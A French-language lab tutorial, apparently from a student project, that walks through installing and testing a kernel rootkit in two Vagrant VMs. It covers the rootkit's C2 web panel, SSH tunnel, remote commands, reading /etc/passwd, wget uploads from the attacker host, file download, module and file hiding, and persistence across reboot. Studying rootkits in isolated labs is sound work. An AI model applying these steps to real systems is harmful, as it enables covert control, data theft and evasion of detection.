# TUTORIEL - GUIDE POUR TESTER LE ROOTKIT 
---

## Étape 1 : Installation de Vagrant

```bash
# Installation de Vagrant en une commande
wget -O - https://apt.releases.hashicorp.com/gpg | sudo gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg

echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com/ $(grep -oP '(?<=UBUNTU_CODENAME=).*' /etc/os-release || lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/hashicorp.list

sudo apt update && sudo apt install vagrant

# Vérification
vagrant --version
```

**Sortie attendue :**
```
Vagrant 2.4.7
```

---

## Étape 2 : Démarrage de l'environnement

```bash
# Clonage du projet
git clone <login>@git.forge.epita.fr:p/epita-apprentissage/wlkom-apping-2027/epita-apprentissage-wlkom-apping-2027-Crystal2.git
cd epita-apprentissage-wlkom-apping-2027-Crystal2

# Démarrage des 2 machines virtuelles
vagrant up
```

**Sortie attendue :**
```
...
    attaquant: 4: enp0s9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    attaquant:     link/ether 08:00:27:74:7b:53 brd ff:ff:ff:ff:ff:ff
    attaquant:     inet 10.0.3.10/24 brd 10.0.3.255 scope global enp0s9
    attaquant:        valid_lft forever preferred_lft forever
    attaquant:     inet6 fe80::a00:27ff:fe74:7b53/64 scope link
    attaquant:        valid_lft forever preferred_lft forever
...
    victime:        valid_lft 86376sec preferred_lft 14376sec
    victime:     inet6 fe80::ca:62ff:feef:6a24/64 scope link
    victime:        valid_lft forever preferred_lft forever
    victime: 3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    victime:     link/ether 08:00:27:14:aa:a6 brd ff:ff:ff:ff:ff:ff
    victime:     inet 10.0.3.11/24 brd 10.0.3.255 scope global enp0s8
    victime:        valid_lft forever preferred_lft forever
    victime:     inet6 fe80::a00:27ff:fe14:aaa6/64 scope link
    victime:        valid_lft forever preferred_lft forever


```

---

## Étape 3 : Configuration de la machine attaquant

### 3.1 Connexion à l'attaquant

```bash
# Terminal 1 - Machine attaquant
vagrant ssh attaquant
```

### 3.2 Lancement de l'interface d'attaque

```bash
# Dans la VM attaquant
cd /home/vagrant/attacking_program
python3 interface9000.sh
```

**Sortie attendue :**
```
Serveur Flask démarré
Dossier uploads: /tmp/flask_uploads
Interface web: http://0.0.0.0:5000
Upload via wget disponible
 * Serving Flask app 'interface9000'
 * Debug mode: on
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:5000
 * Running on http://10.0.2.15:5000
Press CTRL+C to quit
 * Restarting with stat
Serveur Flask démarré
Dossier uploads: /tmp/flask_uploads
Interface web: http://0.0.0.0:5000
Upload via wget disponible
 * Debugger is active!
 * Debugger PIN: 132-006-663
```

**Interface accessible sur : http://192.168.56.4:5000 depuis la machine hote**

**Important : Laisser ce terminal ouvert pour recevoir les notifications**

---

## Étape 4 : Installation du rootkit sur la victime

### 4.1 Connexion à la victime

```bash
# Terminal 2 - Machine victime
vagrant ssh victime
```

### 4.2 Préparation des fichiers (encodage/chiffrement)

```bash
# Dans la VM victime
cd /home/vagrant/rootkit

# Lancement du système de chiffrement des données
sudo bash encodage.sh
```

**Sortie attendue :**
```
Now you will need to enter a password for your filesystem.
You will need to remember this password, as there is absolutely
no recovery mechanism.  However, the password can be changed
later using encfsctl.

New Encfs Password: 
Verify Encfs Password: 
CHIFFREMENT TERMINER
```

### 4.3 Installation du rootkit

```bash
# Installation automatique du rootkit
sudo bash install.sh
```

**Sortie attendue :**
```
vagrant@ubuntu-focal:~/rootkit$ make install 
sudo bash install.sh
Compilation...
Installation du module...
Configuration de la persistance...
Installation terminee
```

**À ce moment, vous devriez voir apparaître dans le navigateur de la machine hote :**
```
[2025-06-15 20:26:01] ubuntu-focal (192.168.56.1) - INSTALLE ET ACTIF
Kernel: Linux 5.4.0-216-generic | Arch: x86_64 | Port: 8005 
```

---

## Étape 5 : Création du tunnel SSH sécurisé

### 5.1 Configuration du tunnel depuis l'attaquant

**Dans un autre terminal, se recconecter sur attaquant puis :**

```bash
vagrant ssh attaquant
cd /home/vagrant/attacking_program

# Lancement du script de configuration automatique du tunnel pour une connection sécurisée
bash TUNNELSSH.sh
```

**Sortie attendue :**
```
Tunnel SSH lancé sur le port 9000.
```

---

## Étape 7 : Accès à l'interface de contrôle depuis le premier terminal attaquant

###  Ouvrir un navigateur sur la machine hote 

#### Tapez l'url suivante pour acceder a l'interface : 

```http://192.168.56.4:5000```

**Sur la page d'accueil, vous verrez :**
```
[2025-06-15 20:26:01] ubuntu-focal (192.168.56.1) - INSTALLE ET ACTIF
Kernel: Linux 5.4.0-216-generic | Arch: x86_64 | Port: 8005 
```

### 7.2 Configuration de la connexion

**Paramètres à saisir :**
- **Adresse IP cible** : `localhost` (via tunnel SSH)
- **Port** : `9000`
- **Mot de passe rootkit** : `crystal2025`

**Cliquer sur "CONNECTER ET AUTHENTIFIER"**

**Message de succès :** "Connexion établie à localhost:9000"

sur l'interface, il suffit de se reconnecter :

**Paramètres à saisir :**
- **Adresse IP cible** : `localhost` (via tunnel SSH)
- **Port** : `9000`

le mot de passe est enregistre dans la session.

---

## Étape 8 : Test des fonctionnalités

### 8.1 Test des commandes système

**Commandes rapides disponibles :**

| Bouton | Commande | Description |
|--------|----------|-------------|
| `uname -a` | `uname -a` | Informations système |
| `id` | `id` | Identité utilisateur courante |
| `ps aux` | `ps aux` | Liste tous les processus |
| `netstat -tuln` | `netstat -tuln` | Connexions réseau |
| `ls -la /root` | `ls -la /root` | Contenu répertoire root |
| `users` | `w` | Utilisateurs connectés |

**Test manuel :**
1. Cliquer sur `uname -a`
2. **Résultat attendu :**
```
Linux ubuntu-focal 5.4.0-216-generic #236-Ubuntu SMP Fri Apr 11 19:53:21 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux

Code de retour: 0
```
**Vous ouvez egalemnt executer la commande de votre choix dans le Mode Commande**

### 8.2 Test de lecture de fichiers

**Mode Fichier :**
1. Cliquer sur l'onglet **"Mode Fichier"**
2. Saisir : `/etc/passwd`
3. Appuyer sur **Entrée**

**Résultat attendu :** Contenu complet du fichier `/etc/passwd`

### 8.3 Test d'upload de fichiers

**Mode Upload :**
1. Cliquer sur l'onglet **"Mode Upload"**
2. **Sélectionner un fichier** depuis votre machine
3. **Chemin de destination** : `/tmp/test_upload.txt`
4. Cliquer sur **"Upload WGET"**

**Résultat attendu :**
```
Upload via WGET: test_upload.txt vers /tmp/test_upload.txt

Commande exécutée: wget -O '/tmp/test_upload.txt' 'http://192.168.56.4:5000/download/test_upload.txt'

Résultat:
--2025-06-17 19:05:55--  http://192.168.56.4:5000/download/test_upload.txt
Connecting to 192.168.56.4:5000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9591 (9.4K) [application/javascript]
Saving to: '/tmp/download_auth.js'

     0K .........                                             100% 44.8M=0s

2025-06-17 19:05:55 (44.8 MB/s) - '/tmp/test_upload.txt' saved [9591/9591]



Code de retour: 0

Upload terminé avec succès
```

### 8.4 Test de download de fichiers

1. Cliquer sur **"Download Fichier"**
2. **Chemin à télécharger** : `/etc/hostname`
3. Confirmer

**Résultat :** Le fichier se télécharge automatiquement sur votre machine

---

## Étape 9 : Vérification de la dissimulation

### 9.1 Test sur la machine victime

```bash
# Dans la VM victime
cd /home/vagrant/rootkit

# Test 1 : Module invisible dans lsmod
lsmod | grep epirootkit
# Aucun résultat (module caché)

# Test 2 : Fichier test caché
ls | grep fichiercache
# Aucun résultat (fichier caché)

# Test 3 : Contenu filtré
cat lignescache
# Affiche seulement : "cette ligne est visible"


### 9.2 Vérifications avancées

```bash
# Le rootkit fonctionne malgré qu'il soit invisible
nc localhost 8005
# AUTH_REQUIRED (rootkit actif)

```

---

## Étape 10 : Test de la persistance

### 10.1 Redémarrage de la machine victime

```bash
# Dans la VM victime
sudo reboot
```

### 10.2 Reconfiguration après redémarrage

```bash
# Reconnexion à l'attaquant
vagrant ssh attaquant

# Relancement du tunnel automatique
cd /home/vagrant/attacking_program
bash TUNNELSSH.sh

reconnection sur le navigateur de la machine hote avec les meme parametres.


```

### 10.3 Vérification après redémarrage

```bash
# Reconnexion à la victime après redémarrage
vagrant ssh victime
cd /home/vagrant/rootkit

# Test de fonctionnement automatique
nc localhost 8005
# AUTH_REQUIRED (rootkit rechargé automatiquement)

# Dissimulation toujours active
ls | grep fichiercache
# Aucun résultat (toujours caché)

# Nouvelle notification sur l'interface attaquant
# Alerte "INSTALLE ET ACTIF" apparaît sur l'interface web
```

---

## Étape 11 : Fonctionnalités avancées

### 11.1 Communications chiffrées via SSH

**Le tunnel SSH garantit :**
- Chiffrement AES-256 de toutes les communications
- Authentification par clés SSH
- Protection contre l'interception réseau
- Masquage du trafic rootkit

### 11.3 Monitoring en temps réel

**L'interface affiche en permanence :**
- Statut de connexion au rootkit
- Informations machine infectée
- Notifications d'installation
- Port 9000 ouvert/fermé (tunnel)

---

## Troubleshooting rapide

### Problème : Tunnel SSH ne fonctionne pas

```bash
# Solution : Reconfigurer le tunnel
cd /home/vagrant/attacking_program
bash TUNNELSSH.sh
```

### Problème : Rootkit ne répond pas

```bash
# Solution 1 : Recharger le module
sudo rmmod epirootkit
sudo insmod epirootkit.ko

# Solution 2 : Réinstaller complètement
sudo bash install.sh
```

---

## Résumé des tests réussis

**Checklist complète :**

- Installation de l'environnement (Vagrant)
- Démarrage des VMs
- Installation rootkit victime
- Tunnel SSH sécurisé établi
- Interface attaquant opérationnelle sur :  http://192.168.56.4:5000 
- Notification automatique reçue
- Connexion via interface web chiffrée
- Exécution de commandes
- Upload/download de fichiers
- Dissimulation des fichiers
- Filtrage des lignes
- Persistance après redémarrage

---

## Nettoyage (optionnel)

```bash
# Suppression de l'environnement de test
# Supprime complètement les VMs
vagrant destroy


```

---
